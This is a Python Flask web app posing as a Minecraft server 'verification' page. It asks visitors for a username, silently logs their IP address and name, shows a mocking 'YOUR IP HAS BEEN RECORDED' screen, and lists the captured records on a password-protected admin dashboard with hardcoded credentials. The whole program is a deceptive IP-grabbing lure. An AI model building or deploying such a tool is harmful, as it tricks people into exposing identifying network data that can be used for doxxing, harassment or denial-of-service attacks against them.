from flask import Flask, request, render_template_string, session, redirect, url_for
import datetime
import os

app = Flask(__name__)
app.secret_key = "1892jf24f928u2g98g8g9jboihg309"

# --- CONFIG ---
ADMIN_PASSWORD = "Sup3r-S3cr3t-P455w0rd"
recorded_ips = []

# --- HTML TEMPLATES ---

VERIFY_HTML = """
<!DOCTYPE html>
<html>
<head><title>Server Verification</title><style>
    body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .box { background: #333; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    input { padding: 10px; width: 200px; border: none; border-radius: 4px; margin-bottom: 10px; font-size: 16px; }
    button { padding: 10px 20px; background: #52a054; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
    button:hover { background: #458a47; }
</style></head>
<body>
    <div class="box">
        <h2 style="margin-top:0;">Game Verification</h2>
        <p style="color: #bbb;">Enter your username to verify your IP for the server.</p>
        <form method="POST">
            <input type="text" name="mc_name" placeholder="eg. Your minecraft username, your nickname, etc..." required autofocus><br>
            <button type="submit">Verify and Join</button>
        </form>
    </div>
</body>
</html>
"""

CAUGHT_HTML = """
<!DOCTYPE html>
<html>
<head><style>
    body { background: #000; color: red; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial Black'; text-align: center; }
    h1 { font-size: 5vw; animation: blink 0.8s infinite; }
    @keyframes blink { 50% { opacity: 0; } }
</style></head>
<body><h1>YOUR IP HAS BEEN RECORDED LOL</h1></body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><title>Admin Dashboard</title><style>
    body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
    table { width: 100%; border-collapse: collapse; background: white; }
    th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
    th { background: #333; color: white; }
    .btn-clear { background: #d32f2f; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; }
</style></head>
<body>
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <h1>IP/Username Logs</h1>
        <form action="/clear" method="POST"><button class="btn-clear">CLEAR ALL</button></form>
    </div>
    <table>
        <tr>
            <th>MC Username</th>
            <th>IP Address</th>
            <th>Timestamp</th>
        </tr>
        {% for entry in logs %}
        <tr>
            <td><strong>{{ entry.name }}</strong></td>
            <td><code>{{ entry.ip }}</code></td>
            <td>{{ entry.time }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# --- ROUTES ---

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('mc_name', 'Unknown')
        
        # Get IP address from Railway headers
        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in ip_addr: ip_addr = ip_addr.split(',')[0].strip()
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %I:%M %p")

        # Save record
        recorded_ips.append({
            "name": username,
            "ip": ip_addr,
            "time": timestamp
        })
        
        return render_template_string(CAUGHT_HTML)
    
    return render_template_string(VERIFY_HTML)

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        return "Wrong Password"
        
    if not session.get('logged_in'):
        return """
        <body style="font-family:sans-serif; text-align:center; padding:50px;">
            <form method="POST">
                <h3>Admin Password</h3>
                <input type="password" name="password" autofocus>
                <input type="submit" value="Login">
            </form>
        </body>
        """
    
    return render_template_string(DASHBOARD_HTML, logs=recorded_ips[::-1])

@app.route('/clear', methods=['POST'])
def clear_logs():
    if session.get('logged_in'):
        recorded_ips.clear()
    return redirect(url_for('dashboard'))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
